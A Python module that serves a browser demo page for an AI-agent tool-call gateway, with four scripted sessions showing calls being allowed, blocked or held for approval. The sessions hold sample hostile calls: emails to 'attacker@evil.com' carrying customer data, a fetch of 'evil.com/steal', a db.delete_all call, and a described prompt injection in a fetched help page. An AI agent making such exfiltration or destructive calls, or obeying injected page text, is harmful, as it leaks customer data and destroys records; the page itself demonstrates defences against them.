"""Interactive demo page: run the gateway's four sessions in the
browser, live.

A visitor clicks "Run" on a session and watches the gateway decide
each call — allowed, blocked, or held — in real time. The page uses
the demo agent key, which is embedded in the page and clearly
labelled as demo-only: it only grants the demo agent's policy, and
the page is off by default (GATEWAY_DEMO_PAGE=1 to enable it).
"""
from __future__ import annotations

PAGE = """<!DOCTYPE html>
<html><head><meta charset='utf-8'>
<title>Agent Gateway — try it</title>
<style>
body{font-family:system-ui,sans-serif;max-width:900px;margin:2rem auto;
padding:0 1rem;color:#1f2328}
h1{font-size:1.4rem} h2{font-size:1.1rem;margin-top:1.5rem}
.session{border:1px solid #d0d7de;border-radius:8px;padding:1rem;
margin:1rem 0}
button{padding:.5rem 1rem;border-radius:6px;border:1px solid #d0d7de;
background:#f6f8fa;cursor:pointer;font:inherit}
button.primary{background:#1f6feb;color:#fff;border-color:#1f6feb}
.call{font-family:monospace;font-size:.9rem;margin:.3rem 0}
.call .allow{color:#1a7f37;font-weight:600}
.call .deny{color:#cf222e;font-weight:600}
.call .held{color:#9a6700;font-weight:600}
.note{color:#57606a;font-size:.9rem}
</style></head><body>
<h1>Agent Gateway — try it</h1>
<p class="note">Each session below runs real calls through the gateway,
live. The demo key in this page only grants the demo agent's policy
— it is not a real credential.</p>
<div id="sessions"></div>
<script>
const DEMO_KEY = 'demo-key-support-bot';
const ANALYST_KEY = 'demo-key-analyst-bot';
const sessions = [
  {id: 'A', title: 'Session A — the basics',
   desc: 'Read a customer, email outside the company (blocked), email inside (allowed), a large refund (held), a destructive call (blocked).',
   calls: [
     ['crm.read_customer', {customer_id: 'cust_1', limit: 5}],
     ['email.send', {to: 'attacker@evil.com', subject: 'x', body: 'exfiltrate'}],
     ['email.send', {to: 'team@company.com', subject: 'hi', body: 'hello'}],
     ['refund.create', {customer_id: 'cust_1', amount: 150}],
     ['refund.create', {customer_id: 'cust_1', amount: 50}],
     ['db.delete_all', {}]]},
  {id: 'B', title: 'Session B — the injection',
   desc: 'Fetch a help page that tells the agent to email the customer list out. The session is tainted, so the exfiltration is blocked — but the internal email still works.',
   calls: [
     ['web.fetch', {url: 'https://docs.company.com/help'}],
     ['email.send', {to: 'attacker@evil.com', subject: 'list', body: 'customers'}],
     ['email.send', {to: 'team@company.com', subject: 'hi', body: 'hello'}]]},
  {id: 'C', title: 'Session C — egress and approval',
   desc: 'Fetch an outside URL (blocked by the egress allowlist), then a large refund (held for a human).',
   calls: [
     ['web.fetch', {url: 'https://evil.com/steal'}],
     ['refund.create', {customer_id: 'cust_1', amount: 150}]]},
  {id: 'D', title: 'Session D — a second agent, a different policy',
   desc: 'The analyst bot is read-only: it may read a customer, but never send email.',
   key: ANALYST_KEY,
   calls: [
     ['crm.read_customer', {customer_id: 'cust_1', limit: 5}],
     ['email.send', {to: 'team@company.com', subject: 'hi', body: 'hello'}]]},
];
async function call(tool, args, session, key) {
  const resp = await fetch('/mcp', {
    method: 'POST',
    headers: {'x-agent-key': key, 'x-session-id': session,
              'content-type': 'application/json'},
    body: JSON.stringify({jsonrpc: '2.0', id: 1, method: 'tools/call',
                          params: {name: tool, arguments: args}})});
  const body = await resp.json();
  if (body.error) return ['deny', body.error.message];
  const result = body.result || {};
  if (result.held_for_approval) return ['held', result.reason];
  const content = (result.content || [{}])[0].text || JSON.stringify(result);
  return ['allow', content];
}
const box = document.getElementById('sessions');
sessions.forEach(s => {
  const div = document.createElement('div');
  div.className = 'session';
  div.innerHTML = `<h2>${s.title}</h2><p>${s.desc}</p>
    <button class="primary">Run session ${s.id}</button>
    <div class="out"></div>`;
  div.querySelector('button').onclick = async () => {
    const out = div.querySelector('.out'); out.innerHTML = '';
    for (const [tool, args] of s.calls) {
      const [verdict, text] = await call(tool, args, s.id,
                                         s.key || DEMO_KEY);
      const line = document.createElement('div');
      line.className = 'call';
      line.innerHTML = `<span class="${verdict}">${verdict.toUpperCase()}</span> ${tool} ${JSON.stringify(args)} — ${text}`;
      out.appendChild(line);
    }
  };
  box.appendChild(div);
});
</script></body></html>
"""


def render_demo_page() -> str:
    return PAGE
